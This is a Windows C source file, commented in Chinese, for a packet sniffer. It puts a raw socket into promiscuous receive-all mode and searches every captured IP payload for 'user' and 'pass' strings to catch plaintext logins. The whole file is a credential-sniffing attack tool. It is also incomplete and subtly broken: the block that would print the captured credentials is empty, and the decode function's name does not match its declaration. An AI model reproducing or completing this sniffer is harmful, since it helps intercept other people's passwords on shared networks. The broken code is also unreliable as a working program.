#include<winsock2.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#pragma comment(lib,"ws2_32.lib")//添加连接库

#define MAX_PACK_LEN 4096//接受的最大ip报文
#define MAX_ADDR_LEN 16//点分十进制地址的最大长度
#define MAX_HOSTNAME_LAN 255//最大主机名长度
#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)//i/o控制命令

typedef struct _iphdr//ip首部
{
	unsigned char h_lenver;//
	unsigned char tos;
	unsigned short total_len;
	unsigned short ident;
	unsigned short frag_and_flags;
	unsigned char ttl;
	unsigned char proto;
	unsigned short checksum;
	unsigned int sourceIP;
	unsigned int destIP;
}IP_HEADER;

SOCKET SockRaw;
int DecodeIpPack(char *,int);//ip解包函数
void CheckSockError(int,char*);//sock错误处理函数

void main(int argc,char ** argv)
{
	int iErrorCode;
	char RecvBuf[MAX_PACK_LEN]={0};
	WSADATA wsaData;
	char name[MAX_HOSTNAME_LAN];
	struct hostent * pHostent;
	SOCKADDR_IN sa;
	DWORD dwBufferLen [10];
	DWORD dwBufferInLen=1;
	DWORD dwBytesReturned=0;

	printf("---- Now sniffing pass,CTRL+C to exit...\n\n");
	//
	iErrorCode=WSAStartup(0x0202,&wsaData);
	CheckSockError(iErrorCode,"WSAStartup");
	SockRaw=socket(AF_INET,SOCK_RAW,IPPROTO_IP);
	CheckSockError(SockRaw,"socket");

	iErrorCode=gethostname(name,MAX_HOSTNAME_LAN);
	CheckSockError(iErrorCode,"gethostname");
	pHostent=(struct hostent *)malloc(sizeof(struct hostent));
	pHostent=gethostbyname(name);
	sa.sin_family=AF_INET;
	sa.sin_port=htons(6000);
	memcpy(&sa.sin_addr.S_un.S_addr,pHostent->h_addr_list[0],pHostent->h_length);
	//绑定套接字
	iErrorCode=bind(SockRaw,(PSOCKADDR)&sa,sizeof(sa));
	CheckSockError(iErrorCode,"bind");
	//将网卡的接受模式设置为混杂模式（设置SOCK_RAW为SIO_RCVALL）,以便接受所有的ip1包
	iErrorCode=WSAIoctl(SockRaw,SIO_RCVALL,&dwBufferInLen,sizeof(dwBufferInLen),
		&dwBufferLen,sizeof(dwBufferLen),&dwBytesReturned,NULL,NULL);
	CheckSockError(iErrorCode,"Ioctl");

	while(1)
	{
		memset(RecvBuf,0,sizeof(RecvBuf));
		iErrorCode=recv(SockRaw,RecvBuf,sizeof(RecvBuf),0);
		CheckSockError(iErrorCode,"recv");
		iErrorCode=DecodeIpPack(RecvBuf,iErrorCode);//对收到的ip包进行解包
		CheckSockError(iErrorCode,"Decode");
	}
}
//ip解包程序
int DecodeIPPack(char *buf,int iBufSize)
{
	IP_HEADER *pIpheader;
	int iIphLen,iTTL;
	char szSourceIP[MAX_ADDR_LEN],szDestIP[MAX_ADDR_LEN];
	SOCKADDR_IN saSource,saDest;

	char *SearchPass,*start,*end;
	
	pIpheader=(IP_HEADER *)buf;
	//获取源ip地址
	saSource.sin_addr.s_addr=pIpheader->sourceIP;
	//得到点分十进制字符串形式的ip地址
	strncpy(szSourceIP,inet_ntoa(saSource.sin_addr),MAX_ADDR_LEN);
	//获取目标IP地址
	saDest.sin_addr.s_addr=pIpheader->destIP;
	//得到点分十进制字符串形式的IP地址
	strncpy(szDestIP,inet_ntoa(saDest.sin_addr),MAX_ADDR_LEN);
	iTTL = pIpheader->ttl;
	//计算ip包头长度
	iIphLen = sizeof(unsigned long)*(pIpheader->h_lenver &0xf);
	SearchPass = buf +iIphLen + 20;

	//---------如果抓到用户名和密码就输出------------
	start = strstr(SearchPass,"user");//查找用户名

	end = strstr(SearchPass,"pass"); //查找密码

	if(start!=NULL&&end!=NULL){



	}
	//------------------------
	return 0;
}

//sock错误处理程序
void CheckSockError(int iErrorCode, char *pErrorMsg){
	if(iErrorCode==SOCKET_ERROR){
		printf("%s Error:%d\n", pErrorMsg, GetLastError());
		closesocket(SockRaw);
		exit(0);
	}
}




























